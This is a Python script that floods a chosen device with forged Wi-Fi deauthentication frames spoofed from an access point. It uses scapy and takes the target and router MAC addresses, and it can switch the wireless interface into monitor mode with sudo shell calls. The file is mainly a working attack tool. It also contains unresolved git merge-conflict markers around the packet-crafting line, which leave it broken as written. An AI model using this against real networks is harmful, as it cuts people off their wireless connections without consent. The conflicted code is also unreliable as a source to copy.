from itertools import count
from tabnanny import verbose
import scapy.all as scapy
from subprocess import call
import optparse

parser = optparse.OptionParser()
parser.add_option('-t', '--target', dest = 'target_mac', help = 'MAC address of the target computer')
parser.add_option('-r', '--router', dest = 'router_mac', help = 'MAC address of the access point')
parser.add_option('-i', '--iface', dest = 'iface', help = 'Interface of the wireless card')
parser.add_option('-m', '--mode', dest = 'mode', help = 'mode of the interface you need to change to')

(options, _) = parser.parse_args()

if options.mode:
    ## setting to monitor mode
    if options.iface:
        if (options.mode == 'monitor') | (options.mode == 'managed'):
            call(f'sudo ifconfig {options.iface} down', shell=True)
            call(f'sudo iwconfig {options.iface} mode {options.mode}', shell=True)
            call(f'sudo ifconfig {options.iface} up', shell=True)
            print(f'[+] {options.iface} changed to {options.mode} mode')

        else:
            print("[-] Unknown mode")
    else:
        print('[-] You need to specify the interface')

else:

    ## crafting the packet
<<<<<<< HEAD
    
    dot_layer = scapy.Dot11(addr1 = options.target_mac, addr2 = options.router_mac, addr3 = options.router_mac)
=======
    print(options.target_mac, options.router_mac)
    dot_layer = scapy.Dot11(type=8, subtype=12, addr1 = options.target_mac, addr2 = options.router_mac, addr3 = options.router_mac)
>>>>>>> 7c49fc9595b5f5bc0ee11b636d60a504d106f46a
    packet = scapy.RadioTap() / dot_layer / scapy.Dot11Deauth()

    ## sending the packet
    scapy.sendp(packet, inter = 0.1, count = 1000, iface = options.iface, verbose = 1)
